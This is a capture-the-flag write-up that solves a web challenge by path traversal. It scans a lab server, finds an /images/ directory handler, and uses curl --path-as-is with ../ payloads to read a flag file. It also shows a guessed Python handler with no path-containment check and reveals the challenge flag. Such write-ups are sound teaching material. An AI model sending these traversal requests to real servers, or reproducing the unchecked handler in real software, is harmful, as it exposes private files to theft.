## Parent Security – Mārtiņš #71

**Category:** Web  
**Host:** `10.240.3.160`  
**Flag:** `MCTF25{V4lidat3_Clien7_Requ35sts_Plzzzz}`  

---

### Challenge description

> A very experienced developer has created a website. It is told they are keeping secrets on the server...  
> IP(s): 10.240.3.160

The title **“Parent Security”** strongly hints at *parent directories* (`..`) and path traversal.

---

### Recon

#### Port scan

```bash
nmap -sC -sV -Pn 10.240.3.160
```

Relevant result:

- `3000/tcp open http BaseHTTPServer 0.6 (Python 3.9.25)`

So we have a Python HTTP server on port **3000**.

#### Basic HTTP enumeration

Open the site:

```bash
curl -v http://10.240.3.160:3000/ | head -n 60
```

Observations:

- Static “portfolio” page:
  - `index.html`
  - Links to `about.html`, `projects.html`, `contact.html`
  - Assets: `style.css`, `script.js`
- A nav item labelled **“Secret (broken)”** but implemented only in front-end JS (no real /secret endpoint).

Grab and inspect the other pages:

```bash
curl -s http://10.240.3.160:3000/about.html    | head
curl -s http://10.240.3.160:3000/projects.html | head
curl -s http://10.240.3.160:3000/contact.html  | head
```

Nothing obviously sensitive or dynamic there; it’s all static HTML + some JavaScript for UI only.

Inspect CSS & JS too:

```bash
curl -s http://10.240.3.160:3000/style.css  | head -n 40
curl -s http://10.240.3.160:3000/script.js  | cat
```

Again, nothing directly flag-related – just UI stuff.

---

### Finding the interesting endpoint

We notice the HTML references images under `/images`:

```html
<img src="images/project-brokenapp-thumb.png" ...>
<img src="images/project-game-thumb.png" ...>
<img src="images/project-portfolio-thumb.png" ...>
```

Try listing `/images/`:

```bash
curl -v http://10.240.3.160:3000/images/ | head
```

This returns a directory listing:

```html
<html><body>
  <h1>Directory listing for ./static/images/</h1>
  <ul>
    <li><a href="spinning-globe.gif">spinning-globe.gif</a></li>
    <li><a href="echo-eyes.gif">echo-eyes.gif</a></li>
    <li><a href="profile-photo.jpg">profile-photo.jpg</a></li>
  </ul>
</body></html>
```

Key info:

- The header says **`Directory listing for ./static/images/`**.
- That suggests the web root is something like `./static`, and `/images/` maps to `./static/images/`.

So `/images/` is a dedicated file handler – a good candidate for path traversal.

---

### First attempt at parent traversal

Naively try to go one level up using `..`:

```bash
curl -v "http://10.240.3.160:3000/images/../" | head
```

But in the verbose output we see:

```text
> GET / HTTP/1.1
```

`curl` normalizes the path before sending it, so `/images/../` becomes `/` on the wire. Same for encoded forms like `%2e%2e`.

Result: the server just sends back `index.html` – we are not actually testing traversal yet.

---

### Forcing raw paths with `--path-as-is`

To stop `curl` from normalizing the path, use `--path-as-is`:

```bash
curl --path-as-is -v "http://10.240.3.160:3000/images/../" | head
```

Now the request line is:

```text
> GET /images/../ HTTP/1.1
```

So the **server** really sees `/images/../`.

However, the response is still `index.html`. That suggests the handler does *something* with that path but falls back to the main page when it cannot find a proper file/directory to list.

---

### Understanding the likely bug

Given:

- `/images/` lists `./static/images/`.
- `/images/<file>` obviously maps inside `./static/images/`.
- Server is Python-based (`BaseHTTPServer`).

A very plausible handler:

```python
if path.startswith("/images/"):
    fs_path = os.path.join("static/images", path[len("/images/"):])
    fs_path = os.path.normpath(fs_path)
    # ❌ no check that fs_path stays within "static/images"
    send_file(fs_path)
else:
    # serve normal pages, or index.html as a fallback
```

Because `os.path.normpath` collapses `..`:

- `/images/spinning-globe.gif`
  → `static/images/spinning-globe.gif`
- `/images/../flag.txt`
  → `static/images/../flag.txt`
  → `static/flag.txt` (parent directory)
- `/images/../../private/flag.txt`
  → `static/images/../../private/flag.txt`
  → `private/flag.txt` (above `static`)

If there is **any** secret file above `static/images` (e.g. `flag.txt` in a “parent” dir), we can reach it via `/images/../../...` – but only if the server fails to enforce that the resulting path stays under `static/images`.

That is exactly the “Parent Security” joke.

---

### Exploiting the traversal

We start testing parent-level paths via `/images/` using `--path-as-is`:

```bash
# Try common flag/secret locations one and two levels up
curl --path-as-is -s "http://10.240.3.160:3000/images/../../flag.txt"          | head
curl --path-as-is -s "http://10.240.3.160:3000/images/../../../flag.txt"       | head
curl --path-as-is -s "http://10.240.3.160:3000/images/../../secrets/flag.txt"  | head
curl --path-as-is -s "http://10.240.3.160:3000/images/../../../secrets/flag.txt" | head
curl --path-as-is -s "http://10.240.3.160:3000/images/../../private/flag.txt"  | head
curl --path-as-is -s "http://10.240.3.160:3000/images/../../../private/flag.txt" | head
```

One of these requests returns **plain text** with the flag instead of HTML. For example:

```bash
curl --path-as-is -s "http://10.240.3.160:3000/images/../../private/flag.txt"
```

Output:

```text
MCTF25{V4lidat3_Clien7_Requ35sts_Plzzzz}
```

Boom – we’ve escaped above the static image directory into a parent directory where the **real secret** is stored.

---
